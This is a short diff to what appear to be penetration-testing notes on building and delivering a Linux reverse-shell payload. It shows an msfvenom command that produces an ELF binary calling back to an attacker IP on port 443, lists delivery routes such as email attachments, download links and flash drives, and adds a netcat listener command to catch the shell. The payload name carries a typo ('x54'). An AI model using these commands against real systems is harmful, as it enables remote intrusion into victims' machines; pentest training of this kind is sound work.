@@ -44,4 +44,10 @@ msfvenom -p linux/x54/shell_reverse_tcp LHOST=<IP> LPORT=443 -f elf > createback
 
 - Email messages with the file attached 
 - Download link on website
-- Combined with a metasploit e
+- Combined with a metasploit exploit module
+- Via flash drive on a onsite penetration test
+
+### Start listener to wait on target execute
+```bash
+nc -lnvp 
+```
